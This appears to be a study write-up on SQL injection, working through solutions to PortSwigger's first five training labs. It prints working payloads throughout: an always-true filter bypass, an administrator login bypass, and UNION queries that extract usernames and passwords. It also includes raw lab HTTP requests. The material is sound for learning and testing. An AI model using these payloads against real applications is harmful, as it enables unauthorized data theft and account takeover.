# SQL Injection

## Summary

SQL Injection is a vulnerability that allows an attacker to interfere with the queries an application makes to a backend database. This can result in:

- Access to restricted data
- Modification of data affecting integrity
- Persistent backdoor

## How to detect SQL Injection

- Add a single quote `'` and look for errors or changes in application behavior
- Add some SQL syntax that equates to the original value of the entry point and look for changes in application response
- Check boolean conditions, e.g., `OR 1=1` and `OR 1=2`
- Add payloads designed to trigger time delays
- Attempt to trigger conditional errors
- Try OAST payloads to trigger an out of band interaction

### Locations

Many SQL injections occur in the `WHERE` clause of a `SELECT` query. They can also occur in the following:

- `UPDATE` statements
- `INSERT` statements
	- within the inserted values
	- within the table or column names
- `SELECT` statements within the `ORDER BY` clause

## Attacks

### Retrieving Hidden Data

It may be possible to retrieve hidden data by injecting an "always true" condition and adding a SQL comment to the query, effectively "canceling out" the remainder of the query after our insertion. 

Consider the following payload:

```
?category=gifts' OR 1=1-- 
```

??? example "PortSwigger SQL Injection Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
	
	`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
	
	To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
	
	**Solution**

	Initial request
	
	```
	GET /filter?category=Gifts HTTP/2
	Host: 0ad6005c030bb02a814c3937007600c2.web-security-academy.net
	Cookie: session=29m8QTQFZk9swi7zTeQvLXNPwOIrGisL
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Referer: https://0ad6005c030bb02a814c3937007600c2.web-security-academy.net/
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1
	X-Pwnfox-Color: green
	Priority: u=0, i
	Te: trailers
	
	```
	
	Adding a single quote causes an internal server error
	
	![](attachments/Pasted%20image%2020250930093633.png)
	
	Sending the following query shows all items and solves the lab
	
	```
	Gifts' OR 1=1-- -
	```

!!! warning "Careful!"
	Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

### Subverting Application Logic

Sometimes, adding a comment to the username field may allow us to log in as any user without needing the password. Consider the following payload:

```
administrator'--
```

??? example "PortSwigger SQL Injection Lab 2: SQL injection vulnerability allowing login bypass"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the login function.
	
	To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator`user.
	
	**Solution**
	
	Initial login request
	
	```
	POST /login HTTP/2
	Host: 0a3c001a0313e455814bfdb800a7008b.web-security-academy.net
	Cookie: session=56bzk4vEqpgSPI0KzrcnQs5b8jkHmGqF
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 78
	Origin: https://0a3c001a0313e455814bfdb800a7008b.web-security-academy.net
	Referer: https://0a3c001a0313e455814bfdb800a7008b.web-security-academy.net/login
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1
	X-Pwnfox-Color: green
	Priority: u=0, i
	Te: trailers
	
	csrf=wokAmmyFudW8aMx2xrsGJMTXVItrTq5C&username=administrator&password=password
	```
	
	Sending the following payload in the `username` field bypasses the login functionality and solves the lab.
	
	```
	administrator'--
	```
	

### SQL Injection UNION Attacks

The `UNION` keyword makes it possible to retrieve data from other tables in the database.

Some considerations for the `UNION` attack:

- Individual queries need to have the same number of columns
- The data types in each column need to be compatible between the individual queries

So we need to figure out:

- How many columns are being returned by the original query?
	- Using `ORDER BY`
	- Using `UNION SELECT null,null,...etc`
- Which columns returned from the original query are suitable data types?

#### Finding the number of columns

??? example "PortSwigger SQL Injection Lab 3: SQL injection UNION attack, determining the number of columns returned by the query"

	Consider the following payload:
	
	```
	' UNION SELECT null-- 
	```
	
	This results in an internal server error
	
	![](attachments/Pasted%20image%2020251002120735.png)
	
	Adding `null`'s until we get a 200 OK response shows that the original query returns 3 columns. 
	
	![](attachments/Pasted%20image%2020251002120836.png)
	
	This solves the lab in this case. 

!!! note "Note on database specific syntax"

	With an Oracle database, every `SELECT` query needs to have a `FROM` keyword and needs to specify a valid table. Oracle has a built-in table named `dual` that can be used for this. 
	
	```
	' UNION SELECT NULL FROM DUAL--
	```
	

#### Finding columns with a useful data type

Once you've figured out how many columns are returned in the query, start replacing `null` with `'a'` to see which columns support a string type. 

??? example "PortSwigger SQL Injection Lab 4: SQL injection UNION attack, finding a column containing text"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
	
	The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
	
	**Solution**
	
	In this case, we need to make the database retrieve the string "AClE5S"
	
	That's a lowercase "L", not a capitol "I". 
	
	![](attachments/Pasted%20image%2020251002121710.png)
	
	After some testing, we find that this query is also returning three columns. 
	
	![](attachments/Pasted%20image%2020251002121801.png)
	
	Replacing `null` with `'a'` shows that the second column is compatible with string data.
	
	![](attachments/Pasted%20image%2020251002121848.png)
	
	Replacing `'a'` with the target string works and solves the lab.
	
	![](attachments/Pasted%20image%2020251002122526.png)


#### Using a UNION attack to retrieve interesting data

Once we know how many columns are returned, and which columns support string data, we can start extracting useful information. 

??? example "PortSwigger SQL Injection Lab 5: SQL injection UNION attack, retrieving data from other tables"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
	
	The database contains a different table called `users`, with columns called `username` and `password`.
	
	To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
	
	**Solution**
	
	We're told that there are two columns, but I tested it anyway and found that both columns support string data. 
	
	The following payload works to solve the lab:
	
	```
	Lifestyle' UNION SELECT username,password FROM users-- 
	```
	
	![](attachments/Pasted%20image%2020251002124654.png)
	
	Now we just log in as the administrator to solve the lab.
	



